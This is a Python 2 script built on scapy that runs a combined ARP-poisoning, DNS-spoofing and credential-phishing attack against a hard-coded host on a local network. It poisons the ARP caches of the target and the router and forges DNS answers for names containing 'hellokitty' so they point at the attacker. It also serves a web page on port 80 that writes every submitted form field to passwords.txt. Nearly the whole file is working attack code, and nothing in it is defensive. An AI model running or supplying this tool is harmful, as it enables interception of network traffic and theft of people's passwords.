from scapy.all import *
from multiprocessing import Process
import SimpleHTTPServer
import SocketServer
import time
import cgi

TARGET_IP = "192.168.0.25"
TARGET_MAC = "98:90:96:dc:f5:4d"
#TARGET_IP = "192.168.0.14"
#TARGET_MAC = "98:90:96:dc:ed:2f"
SENDER_IP = "192.168.0.24"
SENDER_MAC = "98:90:96:dc:f2:de"
ROUTER_IP = "192.168.0.100"
ROUTER_MAC = "00:1a:6d:38:15:ff"
NETWORK_INTERFACE = "eno1"  # Name of the primary network interface


def create_arp_packets():
    global SENDER_IP
    global SENDER_MAC
    global TARGET_IP
    global TARGET_MAC
    global ROUTER_IP
    global ROUTER_IP

    packet1 = ARP(op='who-has', hwsrc=SENDER_MAC, psrc=ROUTER_IP,  pdst=TARGET_IP)
    packet2 = ARP(op='who-has', hwsrc=SENDER_MAC, psrc=TARGET_IP,  pdst=ROUTER_IP)
    return packet1, packet2


def runspoof():
    target_p, router_p = create_arp_packets()
    print "ARP Posioning Thread Started"
    # Send out both packets
    while 1:
        time.sleep(1)
        send(target_p, verbose=0)
        send(router_p, verbose=0)
# Starts the DNS sniffing and spoofing thread.
# Looks for DNS queries coming from the target
# and responds to them with crafted responses.
# @param [String] t_ip
# - IP address of target
def spoof_dns():
    print "DNS Spoofing Thread Started"
    sniff(filter="udp and port 53 and src " + TARGET_IP, prn=parse)
    # look for dns packets from target


def parse(pkt):
    ip = pkt.getlayer(IP)
    dnslayer = pkt.getlayer(DNS)
    if pkt.haslayer(DNS) and ip.src == TARGET_IP and "hellokitty" in dnslayer.qd.qname:
        orgId = pkt.getlayer(DNS).id
        qname = pkt.getlayer(DNS).qd.qname
        ans = DNSRR(rrname=qname, ttl=10, rdata=SENDER_IP)
        dns = DNS(id=orgId, qr=1, qd=pkt.getlayer(DNS).qd, an=ans)
        packet = IP(src=ip.dst, dst=ip.src) / UDP(dport=ip.sport, sport=ip.dport) / dns
        send(packet, verbose=0)


# http://netbuffalo.doorblog.jp/archives/4349178.html

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST',
                     'CONTENT_TYPE': self.headers['Content-Type'],
                     })
        for item in form.list:
            print item
        with open("passwords.txt", "a") as f:
            for item in form.list:
                f.write(str(item) + "\n")
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)


def run_web_server():
    PORT = 80
    Handler = ServerHandler
    httpd = SocketServer.TCPServer(("", PORT), Handler)
    print "serving at port", PORT
    httpd.serve_forever()


def main():
    # Enable IP forwarding
    # 'echo 1 > /proc/sys/net/ipv4/ip_forward'
    p = Process(target=runspoof, args=())
    p1 = Process(target=spoof_dns, args=())
    p2 = Process(target=run_web_server, args=())
    p.start()
    p1.start()
    p2.start()
    p.join()
    p1.join()
    p2.join()

    #  `echo 0 > /proc/sys/net/ipv4/ip_forward`


if __name__ == '__main__':
    main()
